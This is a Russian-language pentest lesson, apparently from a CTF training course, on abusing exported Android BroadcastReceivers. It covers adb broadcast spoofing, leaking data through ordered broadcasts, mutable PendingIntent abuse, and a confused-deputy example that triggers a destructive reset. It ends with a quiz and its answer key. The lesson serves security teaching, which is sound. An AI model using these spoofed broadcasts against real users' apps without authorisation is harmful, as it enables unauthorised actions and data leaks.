---
id: mobile-broadcast-receivers
title: "Broadcast Receivers и злоупотребление Intent-ами"
category: mobile
parent: mobile-exported-components
difficulty: medium
order: 2
tags: [broadcast, receiver, intent, exported, android, ipc]
prerequisites: [mobile-exported-components]
useful_for:
  - "CTF Mobile (запуск receiver/получение флага)"
  - "Bug bounty (злоупотребление экспортированными receiver)"
  - "Пентест мобильных приложений"
estimated_minutes: 30
summary: "Как экспортированные Broadcast Receivers позволяют другим приложениям запускать логику, отправлять поддельные события и утекать данные, и как это тестировать через adb."
---
## Что такое BroadcastReceiver

BroadcastReceiver — компонент Android, принимающий широковещательные сообщения (broadcast). Через них система и приложения уведомляют друг друга о событиях (`BOOT_COMPLETED`, `SMS_RECEIVED`, кастомные события). Если receiver **экспортирован**, любое приложение (или `adb`) может отправить ему broadcast. Опасности: утечка данных (receiver отдаёт данные в ответ/логирует), подделка событий (приложение доверяет broadcast и выполняет действие), запуск внутренних операций. В связке с `PendingIntent` и `Intent`-редиректами это ведёт к серьёзным атакам.

Ментальная модель: broadcast — **недоверенный ввод**. Если приложение обрабатывает его без проверки отправителя/разрешения, вы управляете его поведением.

## Как найти exported receivers

```bash
apktool d app.apk -o out
grep -n -A5 "<receiver" out/AndroidManifest.xml
```

```xml
<receiver android:name=".CommandReceiver" android:exported="true">
  <intent-filter>
    <action android:name="com.target.CMD"/>
    <action android:name="android.intent.action.BOOT_COMPLETED"/>
  </intent-filter>
</receiver>
```

Признаки: `exported=true` без `android:permission`; кастомные actions; `priority` в intent-filter. Декомпилируйте класс и смотрите `onReceive`.

```bash
grep -rn "extends BroadcastReceiver\|onReceive\|getStringExtra\|startService\|startActivity" out_jadx | head
```

Обращайте внимание на receiver-ы, которые из `onReceive` вызывают `startActivity`/`startService` с данными из Intent — это потенциальный confused deputy.

## Отправка broadcast через adb

```bash
# кастомный action
adb shell am broadcast -a com.target.CMD --es cmd "reset" --ez force true
# с указанием компонента (если фильтра нет)
adb shell am broadcast -n com.target.app/.CommandReceiver -a com.target.CMD --es cmd "evil"
# sticky (устарело, но встречается)
adb shell am broadcast -a com.target.EVENT --es data "x"
```

Если receiver защищён permission — получите `SecurityException`; это тоже результат (граница есть). Проверьте `protectionLevel` разрешения.

## Утечка данных через receiver

Некоторые receiver-ы отправляют данные в ответ (`setResultData`, `setResultExtras`) или пишут в лог. Через ordered broadcast можно перехватить ответ.

```bash
# ordered broadcast с получением результата
adb shell am broadcast -a com.target.QUERY --es q "secret" 2>&1
# если receiver отвечает данными — увидим их
```

Также ищите receiver-ы, которые `sendBroadcast` с чувствительными данными без permission — их перехватит любое приложение.

## Intent spoofing и подделка

Если приложение доверяет broadcast (например, «сбросить пароль», «выйти», «открыть экран»), вы подделываете событие:

```bash
adb shell am broadcast -a com.target.LOGOUT
adb shell am broadcast -a com.target.OPEN_URL --es url "https://evil.com"
```

Это может привести к навигации на чужой URL, выполнению действия или даже захвату аккаунта. Особенно опасно, когда receiver вызывает `startActivity` с `intent`-extras.

## Ordered broadcast и priority

`sendOrderedBroadcast` доставляет сообщение получателям по `priority`. Receiver с высоким `priority` может **поглотить** broadcast (`abortBroadcast()`) или изменить его extras. Если ваше приложение с высоким priority перехватывает чужой broadcast — это вектор атаки на другие приложения. И наоборот: ваш receiver с низким priority может не получить сообщение.

## PendingIntent и его флаги

`PendingIntent` — «отложенный» Intent, который выполняет другое приложение. Опасность: если `PendingIntent` создан с неявным Intent и без `FLAG_IMMUTABLE`, получатель может его модифицировать (подменить extras/компонент). Ищите:

```bash
grep -rn "PendingIntent.getActivity\|PendingIntent.getBroadcast\|FLAG_IMMUTABLE\|FLAG_MUTABLE" out_jadx | head
```

Отсутствие `FLAG_IMMUTABLE` при `targetSdk` < 31 — частая находка. В связке с уведомлениями это даёт intent-redirect.

## Разобранный пример: подделка команды

```bash
$ grep -n -A4 "<receiver" out/AndroidManifest.xml
<receiver android:name=".CmdReceiver" android:exported="true">
  <intent-filter><action android:name="com.target.RESET"/></intent-filter>
</receiver>
$ grep -rn "class CmdReceiver" -A15 out_jadx | grep -i "onReceive\|reset"
// onReceive: if ("com.target.RESET".equals(i.getAction())) resetAll();
$ adb shell am broadcast -a com.target.RESET
Broadcast completed: result=0
$ # приложение выполнило сброс -> деструктивное действие без авторизации
```

Любое приложение на устройстве может сбросить состояние жертвы.

## Справочная таблица: векторы через receiver

| Вектор | Признак | Команда |
|--------|---------|---------|
| Подделка события | exported, кастомный action | `am broadcast -a ...` |
| Утечка данных | `setResultData`/лог | `am broadcast` (ordered) |
| Навигация | `startActivity` из onReceive | `--es url ...` |
| Permission-обход | нет `android:permission` | прямой broadcast |
| PendingIntent | нет `FLAG_IMMUTABLE` | подмена extras |
| Ordered-перехват | высокий `priority` | свой receiver |

## Типовые ошибки новичка

- **Искать только exported.** Receiver может быть доступен через `PendingIntent`.
- **Не проверять permission.** Проверьте `protectionLevel` — `normal` выдаётся автоматически.
- **Забыть про system actions.** `BOOT_COMPLETED`/`CONNECTIVITY_CHANGE` тоже могут запускать логику.
- **Игнорировать `startActivity` из receiver.** Это путь к intent-redirect.
- **Не смотреть `PendingIntent`.** Отсутствие `FLAG_IMMUTABLE` — реальная находка.

## Практический чек-лист

1. Собрать все `<receiver>` из манифеста; отметить `exported`/`permission`/actions.
2. Декомпилировать `onReceive`; выписать, что делается с данными Intent.
3. Проверить, вызывает ли receiver `startActivity`/`startService` с extras.
4. Проверить `PendingIntent` (флаги immutable/mutable).
5. Отправить broadcast через `adb` для каждого action.
6. Проверить ordered/sticky и приоритеты.
7. Зафиксировать PoC и impact.

## Что дальше / решение

Порядок: найти receivers → проверить exported/permission → разобрать `onReceive` → отправить broadcast → проверить `PendingIntent`/уведомления. Связанные уроки: `mobile-exported-components`, `mobile-notifications`, `mobile-intents-deeplinks`, `mobile-tapjacking`. Решение — когда подтверждено выполнение действия/утечка через broadcast с воспроизводимым PoC.

## Расширенный разбор: confused deputy и цепочки

Самая опасная разновидность — **confused deputy**: экспортированный receiver (или Activity) выполняет действие от имени приложения-жертвы, используя данные отправителя. Например, receiver с высоким привилегированным контекстом запускает `startService` с `intent` из extras. Вы контролируете `intent` → запускаете внутренний сервис жертвы.

```java
// в onReceive: доверяем extras и передаём дальше
Intent i = (Intent) intent.getParcelableExtra("payload");
i.setClass(this, PrivilegedService.class);   // класс жертвы
startService(i);                             // confused deputy
```

Атака: `am broadcast -a com.target.CMD --es payload ...` (или через `PendingIntent`). Аналогично работает цепочка «broadcast → Activity → deep link → захват аккаунта». Проверяйте каждый receiver, который передаёт `intent`/`extras` дальше без валидации.

## Сравнение с другими компонентами

| Компонент | Точка входа | Типовой вектор |
|-----------|-------------|----------------|
| BroadcastReceiver | `onReceive` | подделка события, утечка |
| Activity | `onCreate`/deep link | intent-redirect, ATO |
| Service (bound) | `onBind`/AIDL | вызов методов |
| ContentProvider | `query`/`openFile` | traversal, SQLi |
| PendingIntent | отложенный Intent | подмена extras |

Broadcast-receiver — самый «тихий» вход: не требует UI, запускается одной командой `adb`, часто не проверяет отправителя. Поэтому его стоит проверять в первую очередь после exported-компонентов.

## Быстрый старт: первые команды

```bash
# найти receivers
grep -n -A5 "<receiver" out/AndroidManifest.xml
# декомпилировать и посмотреть onReceive
grep -rn "extends BroadcastReceiver\|onReceive" out_jadx | head
# отправить broadcast по action
adb shell am broadcast -a com.target.CMD --es cmd "reset"
# отправить конкретному компоненту
adb shell am broadcast -n com.target.app/.CmdReceiver -a com.target.CMD --es cmd "evil"
# проверить PendingIntent-флаги
grep -rn "PendingIntent.get\|FLAG_IMMUTABLE\|FLAG_MUTABLE" out_jadx | head
```

Этого достаточно, чтобы найти незащищённые receiver-ы и подделать событие. Далее — проверьте `startActivity`/`startService` из `onReceive` (confused deputy) и цепочки через уведомления.

## Материалы

Документация Android по `BroadcastReceiver`, `PendingIntent` и флагам immutable/mutable (обязательны с `targetSdk` 31). OWASP MASTG: platform-interaction. Связанные уроки: `mobile-exported-components`, `mobile-intents-deeplinks`, `mobile-notifications`, `mobile-android-binder`.

## Квиз

```quiz
- question: "Что позволяет экспортированный Broadcast Receiver?"
  options:
    - "Другим приложениям/ADB запускать его логику"
    - "Шифровать трафик"
    - "Менять разрешения ОС"
    - "Ускорять запуск"
  answer: 0
  explanation: "Экспортированный receiver принимает внешние broadcast-Intent."
- question: "Как отправить broadcast конкретному receiver через adb?"
  options:
    - "adb shell am broadcast -a ACTION -n pkg/.Receiver"
    - "adb shell am start -a ACTION"
    - "adb shell pm install"
    - "adb shell dumpsys broadcast"
  answer: 0
  explanation: "am broadcast с -a и -n вызывает указанный receiver."
- question: "Когда receiver экспортирован по умолчанию до Android 12?"
  options:
    - "Если у него есть intent-filter"
    - "Всегда"
    - "Никогда"
    - "Только с root"
  answer: 0
  explanation: "Наличие intent-filter делало receiver экспортированным неявно."
- question: "Чем опасен protectionLevel=normal у permission receiver-а?"
  options:
    - "Любое приложение может запросить это разрешение"
    - "Оно шифрует данные"
    - "Оно отключает receiver"
    - "Оно требует root"
  answer: 0
  explanation: "normal-permission запрашивается без проверки подписи."
- question: "Какой adb-командой эмулировать BOOT_COMPLETED для приложения?"
  options:
    - "am broadcast -a android.intent.action.BOOT_COMPLETED -p pkg"
    - "am start -a BOOT"
    - "pm enable boot"
    - "dumpsys boot"
  answer: 0
  explanation: "Так можно заставить receiver обработать загрузочное событие."
```

## Где пригодится

- **CTF Mobile:** прямой запуск receiver для получения флага/токена.
- **Bug bounty:** злоупотребление экспортированными receiver — валидная IPC-находка.
- **Пентест:** аудит межпроцессного взаимодействия приложения.
- **Работа:** ревью манифеста на предмет лишних экспортов.
